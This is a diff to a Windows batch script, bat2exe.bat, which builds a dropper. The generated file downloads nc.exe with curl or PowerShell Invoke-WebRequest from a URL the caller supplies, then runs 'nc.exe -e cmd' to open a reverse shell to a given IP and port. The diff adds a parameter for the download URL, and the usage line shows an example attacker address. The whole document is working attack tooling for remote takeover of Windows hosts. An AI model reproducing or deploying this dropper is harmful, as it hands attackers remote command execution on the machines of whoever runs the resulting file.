@@ -4,14 +4,15 @@ if "%1"=="" goto err
 if "%2"=="" goto err
 set "i=%1"
 set "p=%2"
+set "s=%3"
 set "t=%~dp0x.exe"
 set "b=%~dp0x.bat"
 set "n=x.bat"
 set "d=%~dp0"
 > "%b%" echo @echo off
 >> "%b%" echo powershell -c "Get-Process x -ErrorAction SilentlyContinue | Stop-Process -Force"
->> "%b%" echo powershell -c "if (-Not (Test-Path %d%nc.exe)) { C:\Windows\System32\curl %i%:8888/windows/nc.exe -o %d%nc.exe }"
->> "%b%" echo powershell -c "if (-Not (Test-Path %d%nc.exe)) { powershell -c iwr -Uri %i%:8888/windows/nc.exe -OutFile %d%nc.exe }"
+>> "%b%" echo powershell -c "if (-Not (Test-Path %d%nc.exe)) { C:\Windows\System32\curl %s% -o %d%nc.exe }"
+>> "%b%" echo powershell -c "if (-Not (Test-Path %d%nc.exe)) { powershell -c iwr -Uri %s% -OutFile %d%nc.exe }"
 >> "%b%" echo start /b cmd /c %d%nc.exe -e cmd %i% %p%
 >> "%b%" echo PAUSE
 >> "%b%" echo exit
@@ -49,6 +50,6 @@ goto :eof
 
 :err
 echo -------------------------------------------
-echo    Usage: .\bat2exe.bat 10.10.10.10 4444
+echo    Usage: .\bat2exe.bat 10.10.10.10 4444 http://10.10.10.10:8000/nc.exe
 echo -------------------------------------------
 exit /b 1
